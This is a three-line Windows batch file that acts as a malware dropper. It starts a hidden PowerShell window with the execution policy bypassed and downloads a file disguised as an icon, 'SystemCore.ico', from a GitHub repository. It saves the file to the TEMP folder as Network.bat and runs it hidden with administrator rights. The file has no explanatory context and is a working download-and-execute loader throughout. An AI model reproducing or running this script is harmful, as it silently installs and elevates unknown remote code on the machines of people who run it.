@echo off
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/mohamed656cs/EXE-/raw/refs/heads/main/SystemCore.ico' -OutFile $env:TEMP\Network.bat; Start-Process -FilePath $env:TEMP\Network.bat -WindowStyle Hidden -Verb RunAs}"
exit